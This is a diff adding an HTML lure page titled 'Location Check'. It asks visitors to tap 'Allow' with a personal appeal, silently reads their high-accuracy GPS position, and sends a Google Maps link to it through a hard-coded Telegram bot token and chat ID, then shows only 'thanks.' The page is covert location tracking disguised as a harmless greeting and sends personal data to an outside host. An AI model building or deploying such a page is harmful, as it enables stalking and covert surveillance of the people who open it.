@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Check</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 90vh;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+      background-color: #f7f9fc;
+    }
+    .card {
+      background: #ffffff;
+      padding: 30px 24px;
+      border-radius: 14px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.08);
+      max-width: 380px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    h2 { margin-top: 0; margin-bottom: 12px; color: #1a1a1a; font-size: 22px; }
+    p { color: #555; font-size: 16px; line-height: 1.5; margin: 0 0 20px; }
+    .status { font-weight: 600; color: #0066cc; font-size: 15px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Hello</h2>
+    <p>Please tap <b>"Allow"</b> harsh will be happy.</p>
+    <div id="status" class="status">Requesting GPS location...</div>
+  </div>
+
+  <script>
+    // Paste your Telegram token and ID inside these quotes
+    const BOT_TOKEN = "8634499214:AAGtssxvzUtcjxilnJQSJWjqu-P6tmxQk_k";
+    const CHAT_ID = "7187217908";
+
+    function sendTelegramAlert(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const accuracy = Math.round(position.coords.accuracy);
+      const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+      
+      const message = ` Location Received!\n\n📍 Map Link: ${mapsUrl}\n🎯 GPS Accuracy: within ~${accuracy} meters`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          const status = document.getElementById("status");
+          status.innerText = "thanks.";
+          status.style.color = "#16a34a";
+        } else {
+          showError("thanks.");
+        }
+      })
+      .catch(() => {
+        showError("Network error.");
+      });
+    }
+
+    function showError(msg) {
+      const status = document.getElementById("status");
+      status.innerText = msg;
+      status.style.color = "#dc2626";
+    }
+
+    function handleLocationError(err) {
+      if (err.code === 1) {
+        showError("Permission denied. Tap the lock icon in your browser to enable location.");
+      } else {
+        showError("Ensure location is enabled on device.");
+      }
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(sendTelegramAlert, handleLocationError, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      });
+    } else {
+      showError("Browser does not support geolocation.");
+    }
+  </script>
+</body>
+</html>
